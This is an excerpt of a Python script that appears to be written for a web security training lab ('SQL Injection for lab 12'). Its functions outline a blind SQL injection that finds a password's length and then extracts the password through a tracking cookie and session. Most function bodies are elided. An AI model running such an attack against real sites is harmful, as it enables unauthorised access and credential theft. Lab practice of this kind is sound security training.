...
def find_password_length(url, tracking_id, session_id, proxies=None):
...
def extract_password(url, tracking_id, session_id, password_length, proxies=None):
    password = ""
...
def sql_injection_test(url, use_proxy=False):
    try:
        ...
        password_length = find_password_length(url, tracking_id, session_id, proxies)
        if not password_length:
            print("Could not determine password length")
            return False, None
            
        password = extract_password(url, tracking_id, session_id, password_length, proxies)
        if not password:
...
def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 12')
